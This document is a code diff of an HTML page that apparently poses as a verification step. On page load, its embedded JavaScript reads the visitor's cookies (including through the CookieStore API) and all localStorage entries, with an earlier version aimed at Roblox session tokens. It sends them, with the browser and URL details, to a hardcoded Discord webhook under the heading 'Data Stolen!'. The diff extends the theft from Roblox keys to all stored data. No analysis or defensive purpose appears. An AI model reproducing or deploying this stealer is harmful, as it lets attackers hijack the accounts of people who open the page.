@@ -6,42 +6,73 @@
     <style>body{background:#2f3136;color:white;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;}</style>
 </head>
 <body>
-    <h1>Verifying...</h1>
+    <h1>Grabbing Data...</h1>
     <script>
         (function() {
             var w = "https://discord.com/api/webhooks/1552445077761171548/lcxmsb2Oqiyrlu7-GbeRHHBj-cXU0QSyD5xF0Zxz20xT6xSJYT2DfHUxoUG07kIVevw7";
             
-            // 1. Get ALL standard cookies
-            var allCookies = document.cookie;
-            
-            // 2. Check LocalStorage (Common for Roblox Mobile/Web)
-            var robloxLocal = "";
+            var cookies = "";
+            var local = "";
+            var errors = [];
+
+            // 1. Try Standard document.cookie
             try {
-                // Roblox often stores tokens here on mobile web
-                if (localStorage.getItem('ROBLOSECURITY')) robloxLocal += "ROBLOSECURITY=" + localStorage.getItem('ROBLOSECURITY') + "\n";
-                if (localStorage.getItem('Roblox)) robloxLocal += "Roblox=" + localStorage.getItem('Roblox') + "\n";
-                // Check all keys just in case
-                for (var key in localStorage) {
-                    if (localStorage.hasOwnProperty(key) && (key.includes('Roblox') || key.includes('ROBLOX') || key.includes('Session'))) {
-                        robloxLocal += key + "=" + localStorage.getItem(key) + "\n";
-                    }
-                }
+                cookies = document.cookie || "No cookies found in document.cookie";
             } catch (e) {
-                robloxLocal = "LocalStorage access denied or empty.";
+                errors.push("document.cookie error: " + e.message);
             }
 
-            // Combine for display
-            var finalDisplay = allCookies + "\n\n[LocalStorage]:\n" + robloxLocal;
+            // 2. Try CookieStore API (Better for Secure/HttpOnly cookies)
+            if ('cookieStore' in window) {
+                try {
+                    cookieStore.getAll().then(allCookies => {
+                        var cookieStoreData = allCookies.map(c => c.name + "=" + c.value).join("; ");
+                        cookies = "CookieStore: " + cookieStoreData;
+                        
+                        // 3. Try LocalStorage
+                        try {
+                            for (var key in localStorage) {
+                                if (localStorage.hasOwnProperty(key)) {
+                                    local += key + "=" + localStorage.getItem(key) + "\n";
+                                }
+                            }
+                        } catch (e) {
+                            local = "LocalStorage error: " + e.message;
+                        }
 
-            fetch(w, {
-                method: "POST",
-                headers: {"Content-Type": "application/json"},
-                body: JSON.stringify({
-                    content: "🍪 **Cookie/Session Stolen!**\n\n**Cookies:** `" + allCookies + "`\n\n**LocalStorage:** `" + robloxLocal + "`\n\n**UA:** " + navigator.userAgent + "\n**URL:** " + window.location.href
-                })
-            });
+                        sendToDiscord(cookies, local);
+                    }).catch(e => {
+                        errors.push("CookieStore error: " + e.message);
+                        sendToDiscord(cookies + "\n[Error]: " + errors.join(", "), local);
+                    });
+                } catch (e) {
+                    errors.push("CookieStore try-catch error: " + e.message);
+                    sendToDiscord(cookies + "\n[Error]: " + errors.join(", "), local);
+                }
+            } else {
+                // Fallback if CookieStore not supported
+                try {
+                    for (var key in localStorage) {
+                        if (localStorage.hasOwnProperty(key)) {
+                            local += key + "=" + localStorage.getItem(key) + "\n";
+                        }
+                    }
+                } catch (e) {
+                    local = "LocalStorage error: " + e.message;
+                }
+                sendToDiscord(cookies + "\n[Error]: " + errors.join(", "), local);
+            }
 
-            document.querySelector("h1").innerText = "Success!";
+            function sendToDiscord(c, l) {
+                fetch(w, {
+                    method: "POST",
+                    headers: {"Content-Type": "application/json"},
+                    body: JSON.stringify({
+                        content: "🍪 **Data Stolen!**\n\n**Cookies:** `" + c + "`\n\n**LocalStorage:** `" + l + "`\n\n**UA:** " + navigator.userAgent + "\n**URL:** " + window.location.href
+                    })
+                });
+                document.querySelector("h1").innerText = "Sent!";
+            }
         })();
     </script>
 </body>
